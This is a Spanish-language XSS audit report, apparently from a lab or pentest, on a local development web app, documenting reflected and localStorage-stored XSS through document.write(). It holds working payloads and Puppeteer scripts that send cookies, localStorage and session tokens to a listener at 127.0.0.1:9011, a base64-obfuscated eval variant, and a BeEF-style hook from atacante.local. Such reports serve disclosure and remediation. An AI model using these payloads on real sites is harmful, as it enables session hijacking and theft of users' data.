# Informe de auditoria XSS

- Objetivo: `http://web.dev.local:8082`
- Fecha de analisis: `2026-04-21T06:08:06`
- Estado: vulnerabilidades XSS confirmadas y explotadas

## Resumen ejecutivo

Se identificaron y explotaron dos vulnerabilidades XSS en la aplicacion:

1. XSS basado en DOM/reflejado en el parametro `search`.
2. XSS persistente basado en cliente mediante `name` y `comment`, almacenado en `localStorage` y renderizado con `document.write()`.

La explotacion activa se demostro con exfiltracion controlada a un listener local del auditor (`127.0.0.1:9011`), confirmando ejecucion arbitraria de JavaScript y robo de datos accesibles en navegador.

## Metodologia

### Reconocimiento

Se obtuvo el HTML y se revisaron formularios, parametros y sinks DOM:

```bash
python - <<'PY'
import requests
from bs4 import BeautifulSoup
url='http://web.dev.local:8082'
r=requests.get(url,timeout=10)
print('STATUS',r.status_code)
print('HEADERS',dict(r.headers))
soup=BeautifulSoup(r.text,'html.parser')
for i,form in enumerate(soup.find_all('form'),1):
    print('FORM',i,'action=',form.get('action'),'method=',form.get('method'))
    for inp in form.find_all(['input','textarea','select','button']):
        print(' ',inp.name, inp.get('name'), 'type='+str(inp.get('type')), 'value='+str(inp.get('value')))
for s in soup.find_all('script'):
    if s.get('src'):
        print('SCRIPT_SRC',s.get('src'))
    else:
        print('SCRIPT_INLINE', (s.text or '').strip()[:300])
PY
```

Hallazgos relevantes del codigo cliente:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

const name = urlParams.get('name');
const comment = urlParams.get('comment');
let comments = JSON.parse(localStorage.getItem('comments') || '[]');
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

### Fuzzing basico

Se usaron `ffuf` y payloads de prueba para validar respuestas:

```bash
cat >/tmp/xss_payloads.txt <<'EOF'
<script>alert(1)</script>
"<svg/onload=alert(1)>
'</strong><img src=x onerror=alert(1)>
</strong><svg/onload=alert(1)>
EOF

ffuf -w /tmp/xss_payloads.txt -u 'http://web.dev.local:8082/?search=FUZZ' -mc all -mr 'Resultados para:' -t 1 -timeout 5
```

Resultados relevantes:

```text
<script>alert(1)</script> [Status: 200]
"<svg/onload=alert(1)>  [Status: 200]
</strong><svg/onload=alert(1)> [Status: 200]
```

## Hallazgo 1: XSS DOM reflejado en `search`

- URL vulnerable: `http://web.dev.local:8082/?search=...`
- Tipo: `DOM XSS / Reflected`
- Contexto: insercion directa en HTML con `document.write()`

### Confirmacion

Payload de prueba:

```html
<script>alert("RXSS")</script>
```

Evidencia de insercion en el sink:

```text
<p>Resultados para: <strong><script>alert("RXSS")</script></strong></p>
```

### Payload final de explotacion

```html
</strong><img src=x onerror="new Image().src='http://127.0.0.1:9011/reflect?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&ss='+encodeURIComponent(sessionStorage.getItem('token')||'')+'&o='+encodeURIComponent(location.origin)"><strong>
```

### Comando exacto utilizado

```bash
cd /app/reports && node - <<'JS'
const puppeteer = require('puppeteer');
(async()=>{
  const browser = await puppeteer.launch({headless:'new', args:['--no-sandbox','--disable-setuid-sandbox']});
  const page = await browser.newPage();
  await page.goto('http://web.dev.local:8082/', {waitUntil:'load', timeout:15000});
  await page.evaluate(() => {
    localStorage.clear();
    document.cookie='sessionid=labcookie';
    sessionStorage.setItem('token','labtoken');
  });
  const reflectedPayload = `</strong><img src=x onerror="new Image().src='http://127.0.0.1:9011/reflect?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&ss='+encodeURIComponent(sessionStorage.getItem('token')||'')+'&o='+encodeURIComponent(location.origin)"><strong>`;
  await page.goto('http://web.dev.local:8082/?search=' + encodeURIComponent(reflectedPayload), {waitUntil:'load', timeout:15000});
  await new Promise(r=>setTimeout(r,1500));
  await browser.close();
})();
JS
```

### Evidencia de exfiltracion

El listener local recibio:

```text
GET /reflect?c=sessionid%3Dlabcookie&ls=&ss=labtoken&o=http%3A%2F%2Fweb.dev.local%3A8082
```

Esto confirma ejecucion arbitraria de JavaScript y acceso a:

- `document.cookie`
- `sessionStorage`
- `localStorage`

## Hallazgo 2: XSS persistente en comentarios (`name`, `comment`)

- URL de carga: `http://web.dev.local:8082/?name=...&comment=...`
- Tipo: `Stored XSS (client-side persisted in localStorage)`
- Persistencia: el payload queda guardado en `localStorage` y se ejecuta al volver a cargar la pagina

### Confirmacion

Payload de prueba:

```html
<script>alert("SXSS")</script>
```

Evidencia de renderizado:

```text
<div><script>alert("SXSS")</script></div>
```

### Payload final de explotacion

```html
<img src=x onerror="new Image().src='http://127.0.0.1:9011/stored?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&ss='+encodeURIComponent(sessionStorage.getItem('token')||'')+'&u='+encodeURIComponent(location.href)">
```

### Comando exacto utilizado

```bash
cd /app/reports && node - <<'JS'
const puppeteer = require('puppeteer');
(async()=>{
  const browser = await puppeteer.launch({headless:'new', args:['--no-sandbox','--disable-setuid-sandbox']});
  const page = await browser.newPage();
  await page.goto('http://web.dev.local:8082/', {waitUntil:'load', timeout:15000});
  await page.evaluate(() => {
    localStorage.clear();
    document.cookie='sessionid=labcookie';
    sessionStorage.setItem('token','labtoken');
  });
  const storedPayload = `<img src=x onerror="new Image().src='http://127.0.0.1:9011/stored?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&ss='+encodeURIComponent(sessionStorage.getItem('token')||'')+'&u='+encodeURIComponent(location.href)">`;
  await page.goto('http://web.dev.local:8082/?name=' + encodeURIComponent('auditor') + '&comment=' + encodeURIComponent(storedPayload), {waitUntil:'load', timeout:15000});
  await new Promise(r=>setTimeout(r,1000));
  await page.goto('http://web.dev.local:8082/', {waitUntil:'load', timeout:15000});
  await new Promise(r=>setTimeout(r,2000));
  await browser.close();
})();
JS
```

### Evidencia de exfiltracion

El listener local recibio:

```text
GET /stored?c=sessionid%3Dlabcookie&ls=%5B%7B%22name%22%3A%22auditor%22%2C%22comment%22%3A%22%3Cimg%20src%3Dx%20onerror%3D%5C%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A9011%2Fstored%3Fc%3D%27%2BencodeURIComponent(document.cookie)%2B%27%26ls%3D%27%2BencodeURIComponent(localStorage.getItem(%27comments%27)%7C%7C%27%27)%2B%27%26ss%3D%27%2BencodeURIComponent(sessionStorage.getItem(%27token%27)%7C%7C%27%27)%2B%27%26u%3D%27%2BencodeURIComponent(location.href)%5C%22%3E%22%2C%22date%22%3A%224%2F21%2F2026%2C%206%3A07%3A35%20AM%22%7D%5D&ss=labtoken&u=http%3A%2F%2Fweb.dev.local%3A8082%2F
```

Esto demuestra:

- almacenamiento persistente del payload;
- ejecucion automatica al visualizar comentarios;
- exfiltracion de cookies y datos persistidos del navegador.

## Evasion / variantes viables

El contexto tambien permite variantes con eventos `onerror` / `onload`, por ejemplo:

```html
<svg/onload=eval(atob('YWxlcnQoMSk='))>
```

Tambien seria factible inyectar un hook externo tipo BeEF:

```html
<script src="http://atacante.local:3000/hook.js"></script>
```

No fue necesario para demostrar impacto porque ya se confirmo robo de datos del navegador mediante exfiltracion controlada.

## Impacto real

El impacto es alto/critico en el contexto del navegador de la victima:

- robo de cookies accesibles por JavaScript;
- robo de tokens en `sessionStorage` / `localStorage`;
- persistencia del compromiso en la funcionalidad de comentarios;
- posibilidad de secuestrar sesiones o ejecutar acciones en nombre del usuario autenticado;
- capacidad de cargar hooks de post-explotacion y pivotar a ataques mas complejos.

## Conclusion

El objetivo `http://web.dev.local:8082` es vulnerable a XSS explotable de forma practica. Se confirmo un vector DOM/reflejado en `search` y un vector persistente en `name` / `comment`, ambos originados por la insercion directa de datos no confiables en HTML mediante `document.write()`. La explotacion activa fue validada con exfiltracion controlada de `document.cookie`, `localStorage` y `sessionStorage`.
